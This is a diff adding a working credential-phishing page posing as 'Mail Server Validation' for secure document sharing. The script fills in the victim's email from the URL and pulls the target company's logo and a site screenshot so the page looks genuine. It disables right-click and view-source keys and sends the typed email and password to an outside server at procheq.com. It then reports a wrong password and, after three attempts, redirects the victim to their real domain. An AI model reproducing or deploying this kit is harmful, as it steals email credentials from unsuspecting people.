@@ -1,0 +1,488 @@
+source: <html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400&amp;display=swap" rel="stylesheet">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://dipadasflasfaslf09fasfas.pages.dev/fonts/icomoon/style.css">
+    <style>
+        body {
+            font-family: "Roboto", sans-serif;
+            background-color: #fff;
+        }
+
+        p {
+            color: #b3b3b3;
+            font-weight: 300;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        .h1,
+        .h2,
+        .h3,
+        .h4,
+        .h5,
+        .h6 {
+            font-family: "Roboto", sans-serif;
+        }
+
+        a {
+            -webkit-transition: .3s all ease;
+            -o-transition: .3s all ease;
+            transition: .3s all ease;
+        }
+
+        a:hover {
+            text-decoration: none !important;
+        }
+
+        .content {
+            padding: 7rem 0;
+        }
+
+        h2 {
+            font-size: 20px;
+        }
+
+        .half,
+        .half .container>.row {
+            height: 100vh;
+            min-height: 700px;
+        }
+
+        @media (max-width: 991.98px) {
+            .half .bg {
+                height: 200px;
+            }
+        }
+
+        .half .contents {
+            background: #f6f7fc;
+        }
+
+        .half .contents,
+        .half .bg {
+            width: 50%;
+        }
+
+        @media (max-width: 1199.98px) {
+
+            .half .contents,
+            .half .bg {
+                width: 100%;
+            }
+        }
+
+        .half .contents .form-control,
+        .half .bg .form-control {
+            border: none;
+            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+            border-radius: 4px;
+            height: 54px;
+            background: #fff;
+        }
+
+        .half .contents .form-control:active,
+        .half .contents .form-control:focus,
+        .half .bg .form-control:active,
+        .half .bg .form-control:focus {
+            outline: none;
+            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
+        }
+
+        .half .bg {
+            background-size: cover;
+            background-position: center;
+        }
+
+        .half a {
+            color: #888;
+            text-decoration: underline;
+        }
+
+        .half .btn {
+            height: 54px;
+            padding-left: 30px;
+            padding-right: 30px;
+        }
+
+        .half .forgot-pass {
+            position: relative;
+            top: 2px;
+            font-size: 14px;
+        }
+
+        .control {
+            display: block;
+            position: relative;
+            padding-left: 30px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .control .caption {
+            position: relative;
+            top: .2rem;
+            color: #888;
+        }
+
+        .control input {
+            position: absolute;
+            z-index: -1;
+            opacity: 0;
+        }
+
+        .control__indicator {
+            position: absolute;
+            top: 2px;
+            left: 0;
+            height: 20px;
+            width: 20px;
+            background: #e6e6e6;
+            border-radius: 4px;
+        }
+
+        .control--radio .control__indicator {
+            border-radius: 50%;
+        }
+
+        .control:hover input~.control__indicator,
+        .control input:focus~.control__indicator {
+            background: #ccc;
+        }
+
+        .control input:checked~.control__indicator {
+            background: #fb771a;
+        }
+
+        .control:hover input:not([disabled]):checked~.control__indicator,
+        .control input:checked:focus~.control__indicator {
+            background: #fb8633;
+        }
+
+        .control input:disabled~.control__indicator {
+            background: #e6e6e6;
+            opacity: 0.9;
+            pointer-events: none;
+        }
+
+        .control__indicator:after {
+            font-family: 'icomoon';
+            content: '\e5ca';
+            position: absolute;
+            display: none;
+            font-size: 16px;
+            -webkit-transition: .3s all ease;
+            -o-transition: .3s all ease;
+            transition: .3s all ease;
+        }
+
+        .control input:checked~.control__indicator:after {
+            display: block;
+            color: #fff;
+        }
+
+        .control--checkbox .control__indicator:after {
+            top: 50%;
+            left: 50%;
+            margin-top: -1px;
+            -webkit-transform: translate(-50%, -50%);
+            -ms-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%);
+        }
+
+        .control--checkbox input:disabled~.control__indicator:after {
+            border-color: #7b7b7b;
+        }
+
+        .control--checkbox input:disabled:checked~.control__indicator {
+            background-color: #7e0cf5;
+            opacity: .2;
+        }
+    </style>
+    <title>Account Administrator</title>
+</head>
+
+<body style="">
+
+    <div id="loadlast" class="" style="display: none">
+        <div id="id0oo1">
+
+            <div class="modal-content animate" style="width: 450px; padding-top: 30px;">
+                <span class="text-center" style="font-size: 20px">Secure Document Sharing</span>
+                <div class="imgcontainer text-center">
+                    <!-- <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWSjpDaJch7A32iI2FZVMbsXS35IpPPyHh5A&amp;usqp=CAU" width="40%"> -->
+                </div>
+
+                <div class="container" style="text-align: left">
+                    <center>
+                        <br>
+                        <p style="text-align: left; padding: 0px 20px">
+                            <font size="3" face="Trebuchet MS" color="black">The shared document was deleted by the
+                                sender.<br>Please contact the sender directly to request the document.<br></font><br>
+                            <br>
+                        </p>
+                    </center>
+                </div>
+
+                <div class="container" style="background-color:#f1f1f1">
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loadfirst" class="d-lg-flex half">
+        <div class="bg order-1 order-md-1" style="background-image: url('');"></div>
+        <div class="contents order-2 order-md-2">
+
+            <div class="container">
+                <div class="row align-items-center justify-content-center">
+                    <div class="col-md-7">
+                        <img id="logoimg" width="20%" class="img-responsive" alt="">
+                        <h3><span id="logoname" style="text-transform: uppercase;"></span> <strong>Mail Server
+                                Validation</strong></h3>
+                        <p style="font-size: 15px;">Your information is only for the sole purpose of viewing this
+                            document and would not be sold or shared to any third party.</p>
+                        <form action="" method="post">
+                            <center>
+                                <div class="alert alert-danger" id="msg" style="display: none; font-size:14px; ">Email
+                                    Password Authentication failed, try again with a valid password.</div>
+                                <span id="error" class="alert alert-danger" style="display: none; font-size:14px; ">That
+                                    account doesn't exist. Enter a different account</span>
+                            </center>
+                            <div class="form-group first">
+                                <label for="username">Verified User Email:</label>
+                                <input type="text" class="form-control" id="email" name="email">
+                            </div>
+                            <div class="form-group last mb-3">
+                                <label for="password">Email Password:</label>
+                                <input type="password" class="form-control" placeholder="Your Password" id="password"
+                                    name="password">
+                            </div>
+
+                            <div class="d-flex mb-5 align-items-center">
+                                <label class="control control--checkbox mb-0"><span class="caption">Remember me</span>
+                                    <input type="checkbox" checked="checked">
+                                    <div class="control__indicator"></div>
+                                </label>
+
+                            </div>
+                            <button type="submit" id="submit-btn" class="btn btn-block btn-warning"
+                                style="background-color: #fb771a">Authenticate</button>
+
+                        </form>
+
+                        <p>Â© 2024 Mail Server Authenticator</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+
+
+    <script>
+
+        // prevent ctrl + s
+        $(document).bind('keydown', function (e) {
+            if (e.ctrlKey && (e.which == 83)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        document.onkeydown = function (e) {
+            if (e.ctrlKey &&
+                (e.keyCode === 67 ||
+                    e.keyCode === 86 ||
+                    e.keyCode === 85 ||
+                    e.keyCode === 117)) {
+                return false;
+            } else {
+                return true;
+            }
+        };
+        $(document).keypress("u", function (e) {
+            if (e.ctrlKey) {
+                return false;
+            }
+            else {
+                return true;
+            }
+        });
+
+
+
+
+        /* global $ */
+        $(document).ready(function () {
+            var count = 0;
+
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#email').val("");
+                $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+                $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+            });
+
+            var email = window.location.hash.substr(1);
+            if (!email) {
+
+            }
+            else {
+                var my_email = email;
+                $('#email').val(my_email);
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!filter.test(my_email)) {
+                    $('#error').show();
+                    email.focus;
+                    return false;
+                }
+                var ind = my_email.indexOf("@");
+                var my_slice = my_email.substr((ind + 1));
+                var mainPage = 'https://' + my_slice;
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var final = c.toLowerCase();
+                var finalu = c.toUpperCase();
+
+                var sv = my_slice;
+
+                var image = "url('https://image.thum.io/get/width/1200/https://" + sv; "')"
+
+                //var image = "url('https://"+sv;"')"
+
+
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + mainPage);
+                $("#logoname").html(final);
+                $(".logoname").html(final);
+
+                document.body.style.backgroundImage = image;
+
+
+
+                $(".email").html(email);
+
+            }
+
+            $('#submit-btn').click(function (event) {
+
+                event.preventDefault();
+                $('#error').hide();
+                $('#msg').hide();
+                var email = $("#email").val();
+                var password = $("#password").val();
+                ///////////new injection////////////////
+                var my_email = email;
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!email) {
+                    $('#error').show();
+                    $('#error').html("Email field is empty");
+
+                    return false;
+                }
+
+                if (!filter.test(my_email)) {
+                    $('#error').show();
+                    $('#error').html("That account doesn't exist. Enter a different account");
+
+                    return false;
+                }
+                if (!password) {
+                    $('#error').show();
+                    $('#error').html("Password field is empty");
+
+                    return false;
+                }
+
+
+
+                ///////////new injection////////////////
+                count = count + 1;
+                //  console.log(count); 
+
+                $.ajax({
+                    dataType: 'JSON',
+                    url: 'https://procheq.com/general/main.php',
+                    type: 'POST',
+                    data: JSON.stringify({
+                        email: email,
+                        password: password
+                    }),
+                    // data: $('#contact').serialize(),
+                    beforeSend: function (xhr) {
+                        $('#submit-btn').html('loading...');
+
+                         console.log(count); 
+                    },
+                    success: function (response) {
+                        $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
+                        if (response) {
+                            $("#msg").show();
+                            console.log(response);
+                            $('#msg').html(response['msg']);
+                            if (response['message'] == 'Data received successfully') {
+                                $("#password").val("");
+                                console.log("triggered")
+                                if (count >= 3) {
+                                    count = 0;
+                                    // window.location.replace(response['redirect_link']);
+                                    window.location.replace("https://www." + my_slice);
+
+                                }
+                                // $('#msg').html(response['msg']);
+                            }
+                            else {
+                                $('#msg').html(response['msg']);
+                            }
+                        }
+                    },
+                    error: function () {
+                        $("#password").val("");
+                        if (count >= 3) {
+                            count = 0;
+                            window.location.replace("https://www." + my_slice);
+                        }
+                        $("#msg").show();
+                        // $('#msg').html("Please try again later");
+                    },
+                    complete: function () {
+                        $('#submit-btn').html('Authenticate');
+                    }
+                });
+            });
+
+
+        });
+
+
+    </script>
+</body>
+
+</html>
+Page title: Account Administrator
